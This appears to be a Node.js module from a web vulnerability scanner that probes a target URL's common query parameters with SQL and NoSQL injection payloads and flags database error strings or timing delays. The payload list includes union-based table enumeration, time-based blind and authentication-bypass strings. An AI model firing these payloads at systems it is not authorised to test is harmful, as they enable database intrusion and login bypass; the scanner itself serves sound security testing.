const axios = require('axios');

// ═══════════════════════════════════════════════════
// SQL Injection Scanner — representative payloads, parallel
// ═══════════════════════════════════════════════════

// Trimmed to most representative payloads (was 60+)
const PAYLOADS = [
  // Boolean-based
  "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", ") OR ('1'='1",
  // Union-based
  "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT 1,2,3--",
  "' UNION SELECT table_name,NULL FROM information_schema.tables--",
  // Error-based
  "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
  "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
  // Time-based blind
  "' AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--", "' AND pg_sleep(3)--",
  // NoSQL
  '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
  // Auth bypass
  "admin' OR '1'='1", "' OR ''='", "' OR 'x'='x", "') OR ('x'='x",
  // Stacked
  "'; SELECT 1;--",
];

// Tightened to very specific SQL error strings only (no generic words)
const ERROR_PATTERNS = [
  'error in your sql syntax', 'mysql_fetch', 'mysqli_', 'pg_query', 'sqlite3.',
  'ORA-0', 'ORA-1',  // Oracle errors always followed by digits
  'SQL Server Driver', 'microsoft ole db provider',
  'unclosed quotation mark', 'quoted string not properly terminated',
  'syntax error at or near', 'jet database engine',
  'Warning: mysql_', 'Warning: pg_', 'Warning: sqlite',
  'PSQLException', 'org.postgresql',
  'com.mysql.jdbc', 'java.sql.SQLException', 'System.Data.SqlClient.SqlException',
  'PDOException', 'MongoError', 'OperationalError',
  'django.db.utils', 'sqlalchemy.exc', 'no such table',
  'XPATH syntax error', 'extractvalue(', 'updatexml(',
];

// Top 4 params only
const PARAMS = ['id', 'search', 'q', 'user'];

const REQ_TIMEOUT = 8000;    // 8s per request (allows time-based detection)
const BATCH_SIZE  = 5;       // parallel payloads per batch
const SCANNER_TIMEOUT = 90000; // 90s hard cap (time-based payloads need more time)

async function scan(targetUrl) {
  const results = { tests: [], findings: [] };
  const deadline = Date.now() + SCANNER_TIMEOUT;

  const safeGet = (url) =>
    axios.get(url, {
      timeout: REQ_TIMEOUT,
      validateStatus: () => true,
      maxRedirects: 2,
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' }
    }).catch(() => null);

  try {
    for (let i = 0; i < PAYLOADS.length; i += BATCH_SIZE) {
      if (Date.now() > deadline) break;  // hard stop

      const batch = PAYLOADS.slice(i, i + BATCH_SIZE);
      const batchResults = await Promise.all(batch.map(async (payload) => {
        const isTimeBased = /SLEEP|WAITFOR|pg_sleep|BENCHMARK/.test(payload);

        for (const param of PARAMS) {
          if (Date.now() > deadline) break;
          const start = Date.now();
          const r = await safeGet(`${targetUrl}?${param}=${encodeURIComponent(payload)}`);
          if (!r) continue;

          const elapsed = Date.now() - start;
          const body = typeof r.data === 'string' ? r.data.toLowerCase() : '';

          // Error-based detection
          for (const pat of ERROR_PATTERNS) {
            if (body.includes(pat.toLowerCase())) {
              return { param, payload, type: 'error-based', pattern: pat };
            }
          }

          // Time-based detection
          if (isTimeBased && elapsed > 2500) {
            return { param, payload, type: 'time-based', elapsed };
          }
        }
        return { payload, type: 'none' };
      }));

      for (const res of batchResults) {
        if (res.type === 'error-based') {
          results.tests.push({ id: `sqli-err-${res.param}`, name: `SQLi error pattern in ?${res.param}: ${res.pattern}`, status: 'fail', severity: 'critical' });
          results.findings.push({ param: res.param, payload: res.payload.substring(0, 50), pattern: res.pattern, type: 'error-based' });
        } else if (res.type === 'time-based') {
          results.tests.push({ id: `sqli-time-${res.param}`, name: `SQLi time-based delay (${res.elapsed}ms) in ?${res.param}`, status: 'fail', severity: 'critical' });
          results.findings.push({ param: res.param, payload: res.payload.substring(0, 50), elapsed: res.elapsed, type: 'time-based' });
        } else {
          results.tests.push({ id: `sqli-payload-${results.tests.length}`, name: `SQLi payload: ${res.payload.substring(0, 55)}`, status: 'pass', severity: 'info' });
        }
      }
    }
  } catch (err) {
    results.error = err.message;
  }

  return { scanner: 'SQL Injection', icon: '🗄️', results, testCount: results.tests.length };
}

module.exports = { scan };
